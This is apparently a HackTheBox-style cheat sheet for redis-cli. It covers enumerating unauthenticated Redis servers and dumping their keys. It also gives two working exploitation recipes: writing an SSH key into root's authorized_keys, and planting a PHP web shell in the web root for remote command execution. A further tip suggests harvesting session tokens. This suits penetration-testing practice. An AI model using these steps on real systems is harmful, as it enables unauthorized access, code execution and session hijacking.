# Redis Tools - Talk to Redis Servers

CLI client for connecting to and interacting with Redis databases.

## What It Does

Redis is an in-memory key-value store that often runs on port 6379. Many Redis instances have no authentication by default, so if you find one open, you can connect and start poking around. You might find stored credentials, session tokens, or application data. Even better, Redis can sometimes be abused to write files on disk, which can lead to remote code execution.

## Install

```bash
sudo apt install redis-tools
```

## Basic Usage

```bash
# Connect to a Redis server
redis-cli -h 10.10.10.20

# Connect with a password
redis-cli -h 10.10.10.20 -a 'password123'

# Connect to a non-default port
redis-cli -h 10.10.10.20 -p 6380
```

## Practical Examples

```bash
# After connecting, get server info
INFO                          # Dump server info (version, OS, config)
CONFIG GET *                  # Show all configuration settings

# Explore stored data
KEYS *                        # List all keys (careful on big databases)
GET keyname                   # Get value of a string key
TYPE keyname                  # Check what type a key is
HGETALL hashkey               # Get all fields from a hash
LRANGE listkey 0 -1           # Get all items from a list

# Dump all databases
SELECT 0                      # Switch to database 0
KEYS *
SELECT 1                      # Switch to database 1
KEYS *
# Repeat up to SELECT 15 (default max)

# Write an SSH key for access (classic exploit)
redis-cli -h 10.10.10.20
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename "authorized_keys"
SET sshkey "\n\nssh-rsa AAAA...your-public-key...\n\n"
SAVE
# Now SSH in with your private key
```

## RCE via Webshell

```bash
# If you know the web root path
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename "shell.php"
SET payload "<?php system($_GET['cmd']); ?>"
SAVE
# Then visit http://10.10.10.20/shell.php?cmd=id
```

## HTB Tips

- No auth is the default for Redis. If port 6379 is open, just try connecting
- Always run `INFO` first to see the Redis version and OS details
- The SSH key write trick works when Redis runs as root (common on older boxes)
- The webshell trick works if you can guess the web root path
- Look for session tokens in keys, they might let you hijack user sessions
- Redis data is in memory, so `KEYS *` gives you everything fast
- Check for the `requirepass` config. If it is set, you need a password
